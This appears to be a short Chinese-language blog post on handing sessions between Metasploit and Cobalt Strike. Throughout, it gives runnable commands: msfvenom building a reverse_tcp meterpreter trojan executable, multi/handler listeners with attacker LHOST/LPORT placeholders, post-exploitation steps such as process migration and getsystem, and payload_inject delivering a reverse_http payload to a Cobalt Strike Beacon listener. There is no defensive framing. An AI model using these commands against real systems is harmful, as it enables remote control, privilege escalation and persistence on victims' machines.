MSF+CS

发表于2021-12-10|更新于2022-10-20|前提知识
|阅读量:

CS派生给MSF

use exploit/multi/handler ；设置监听

set payload windows/meterpreter/reverse_tcp ;设置攻击的payload;

set lhost xxx.xxx.xxx.xxx 设置服务器地址

set lport xxx 设置服务器监听端口

run或者exploit 执行

进入控制台

MSF派生给CS

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=<本机端口> -f exe > shell.exe；Linux生成木马

use exploit/multi/handler ；设置监听

set payload windows/meterpreter/reverse_tcp ;设置攻击的payload;

set lhost xxx.xxx.xxx.xxx 设置服务器地址

set lport xxx 设置服务器监听端口

run或者exploit 执行

进入控制台

ps-migrate <目的进程位置>-getuid-getsystem-shell-chcp 65001-exit
background(挂起会话)- 可选择<session -i 1(进入会话)>

CS端配置监听，payload配置Beacon HTTP,地址、端口；

转回MSF

use exploit/windows/local/payload_inject 设置注入

set payload windows/meterpreter/reverse_http 设置payload

set session <> 设置会话

set lhost xxx.xxx.xxx.xxx 设置地址

set lport xxx 设置端口

run 执行，派生成功；
